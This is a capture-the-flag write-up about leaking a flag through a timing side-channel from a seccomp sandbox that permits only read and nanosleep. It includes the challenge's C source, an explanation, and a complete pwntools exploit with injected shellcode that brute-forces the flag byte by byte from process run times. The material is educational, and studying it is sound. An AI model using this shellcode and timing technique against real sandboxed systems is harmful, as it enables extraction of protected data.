#metadata(
  (
    title: "Timing side-channel via nanosleep",
    description: "Using the nanosleep syscall to create a timing side-channel for leaking data when traditional output channels are blocked.",
    date: "2025-12-30",
    order: 11,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Timing side-channel via nanosleep

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

The challenge allows `read` and `nanosleep`. While `exit` is not explicitly allowed (the default action is kill), getting killed is effectively an immediate exit.

The vulnerability is that `nanosleep` allows us to control how long the process runs. We can read the flag byte-by-byte and execute a conditional `nanosleep` based on the value of the byte.

*   If our guess is correct -> Sleep for 1 second.
*   If our guess is wrong -> Exit immediately (trigger seccomp violation).

By measuring the time the process takes to terminate, we can determine the value of each byte.

== Exploitation Plan

1.  **Read Flag:** Read the flag from the pre-opened FD 3 into memory.
2.  **Compare Byte:** Compare the target byte with a candidate value.
3.  **Conditional Sleep:**
    *   If equal: Call `nanosleep` for 1 second.
    *   If not equal: Trigger immediate termination (e.g., call a forbidden syscall).
4.  **Measure Time:** The python script measures execution time. If > 0.5s, the guess is correct.

== Exploit Script

```python
from pwn import *
import time

exe = "./challenge"
context.binary = exe

flag = ""
index = 0

while True:
    found = False
    # Iterate through printable characters (and others if needed)
    for char_code in range(32, 127): 
        shellcode = asm(f"""
            /* read(3, stack, 100) */
            mov rdi, 3
            mov rsi, rsp
            mov rdx, 100
            mov rax, 0
            syscall

            /* Compare buffer[index] with guess */
            movzx rax, byte ptr [rsp + {index}]
            cmp rax, {char_code}
            jne exit_now

            /* nanosleep({{1, 0}}, NULL) */
            /* Construct timespec on stack: 1 second, 0 nanoseconds */
            push 0
            push 1
            mov rdi, rsp
            xor rsi, rsi
            mov rax, 35         /* syscall: SYS_nanosleep */
            syscall

        exit_now:
            /* Trigger immediate exit/kill */
            mov rax, 60
            syscall
        """)

        start_time = time.time()
        
        # Run process quietly
        p = process([exe, "/flag"], level='error')
        p.send(shellcode)
        
        # Wait for it to finish (or kill it if it sleeps too long)
        # Using wait() blocks until exit.
        p.wait_for_close()
        
        duration = time.time() - start_time
        
        # If it took significant time, we found the char
        if duration > 0.5:
            flag += chr(char_code)
            print(f"Found: {chr(char_code)} | Flag: {flag}")
            found = True
            break
    
    if not found:
        print("End of flag or char not found.")
        break
    index += 1
```
